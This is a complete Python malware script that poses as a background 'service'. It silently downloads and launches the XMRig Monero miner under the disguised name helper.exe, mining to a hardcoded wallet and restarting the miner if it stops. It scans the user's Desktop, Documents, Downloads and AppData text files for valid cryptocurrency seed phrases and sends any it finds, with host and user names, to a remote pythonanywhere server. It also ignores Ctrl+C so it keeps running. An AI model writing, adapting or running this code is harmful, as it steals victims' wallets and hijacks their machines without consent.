import os
import re
import time
import requests
import subprocess
import threading
import zipfile
import psutil
from pathlib import Path
from mnemonic import Mnemonic

mnemo = Mnemonic("english")
SERVER = "https://kryhrqs.pythonanywhere.com/export"
WALLET = "Bv3WEwFb17vKiiLGM7xc1UtxzWWfmzNimkq7CyVBjLfU"
TEMP = os.environ.get('TEMP', 'C:\\Windows\\Temp')
MINER = os.path.join(TEMP, 'helper.exe')
LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'service_log.txt')

def log(msg):
    try:
        with open(LOG, 'a') as f:
            f.write(f"{time.ctime()} - {msg}\n")
    except:
        pass

def send(data):
    try:
        requests.post(SERVER, json={
            'time': time.time(),
            'host': os.getenv('COMPUTERNAME', ''),
            'user': os.getenv('USERNAME', ''),
            'data': data
        }, timeout=10)
        log(f"Sent: {data.get('type', 'unknown')}")
    except Exception as e:
        log(f"Send error: {e}")

def start_miner():
    """Download and start miner, retry if not working."""
    log("Miner starting...")
    
    # Download miner
    if not os.path.exists(MINER):
        log("Downloading miner...")
        try:
            zip_path = os.path.join(TEMP, 'x.zip')
            r = requests.get(
                'https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip',
                stream=True, timeout=60
            )
            if r.status_code == 200:
                with open(zip_path, 'wb') as f:
                    for chunk in r.iter_content(8192):
                        f.write(chunk)
                with zipfile.ZipFile(zip_path, 'r') as z:
                    z.extractall(TEMP)
                for root, dirs, files in os.walk(TEMP):
                    for f in files:
                        if f == 'xmrig.exe':
                            os.rename(os.path.join(root, f), MINER)
                            log(f"Miner downloaded to: {MINER}")
                            break
            else:
                log(f"Download failed: {r.status_code}")
                return
        except Exception as e:
            log(f"Download error: {e}")
            return
    
    # Launch miner
    def launch():
        try:
            subprocess.Popen(
                [MINER, '--url=pool.supportxmr.com:3333', f'--user={WALLET}',
                 '--pass=x', '--threads=2', '--keepalive', '--donate-level=1'],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            log("Miner launched")
        except Exception as e:
            log(f"Miner launch error: {e}")
    
    # Check if miner is actually running
    def is_miner_running():
        try:
            for proc in psutil.process_iter(['name', 'cpu_percent']):
                if proc.info['name'] == 'helper.exe':
                    if proc.info['cpu_percent'] > 1:
                        return True
            return False
        except:
            return False
    
    launch()
    
    # Monitor and retry if not working
    def monitor():
        retries = 0
        while retries < 5:
            time.sleep(10)
            if is_miner_running():
                log("Miner is running (CPU detected)")
                return
            else:
                retries += 1
                log(f"Miner not running, retry {retries}/5")
                # Kill any existing instances
                try:
                    os.system('taskkill /F /IM helper.exe >nul 2>&1')
                except:
                    pass
                launch()
        
        log("Miner failed to start after 5 retries")
    
    threading.Thread(target=monitor, daemon=True).start()

def scan_file(path):
    """Scan a file for valid seed phrases only."""
    try:
        if os.path.getsize(path) > 1 * 1024 * 1024:
            return
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            if not content or len(content) < 20:
                return
            
            # Extract all words
            words = re.findall(r'\b[a-zA-Z]+\b', content)
            
            # Check for 12-word seed phrases
            for i in range(len(words) - 11):
                phrase = ' '.join(words[i:i+12])
                try:
                    if mnemo.check(phrase):
                        log(f"FOUND SEED: {path}")
                        send({'type': 'seed', 'path': path, 'content': phrase})
                        return
                except:
                    pass
            
            # Check for 24-word seed phrases
            for i in range(len(words) - 23):
                phrase = ' '.join(words[i:i+24])
                try:
                    if mnemo.check(phrase):
                        log(f"FOUND 24-WORD SEED: {path}")
                        send({'type': 'seed_24', 'path': path, 'content': phrase})
                        return
                except:
                    pass
    except:
        pass

def scan_folders():
    """Scan user folders for seed phrases."""
    folders = [
        os.path.expandvars("%USERPROFILE%\\Desktop"),
        os.path.expandvars("%USERPROFILE%\\Documents"),
        os.path.expandvars("%USERPROFILE%\\Downloads"),
        os.path.expandvars("%APPDATA%"),
        os.path.expandvars("%USERPROFILE%"),
    ]
    
    for folder in folders:
        if os.path.exists(folder):
            log(f"Scanning: {folder}")
            for root, dirs, files in os.walk(folder):
                # Skip temp and cache
                skip = ['Temp', 'Cache', 'cache', 'node_modules', '.git']
                dirs[:] = [d for d in dirs if d not in skip]
                
                for f in files:
                    if f.endswith('.txt'):
                        scan_file(os.path.join(root, f))

def main():
    log("=" * 50)
    log("SERVICE STARTED")
    
    # Start miner with retry
    log("Starting miner...")
    threading.Thread(target=start_miner, daemon=True).start()
    
    # Start scanner
    log("Starting scanner...")
    threading.Thread(target=scan_folders, daemon=True).start()
    
    log("All started. Running.")
    
    # Keep alive
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        log("Ctrl+C received - continuing background work.")
        while True:
            time.sleep(60)

if __name__ == '__main__':
    main()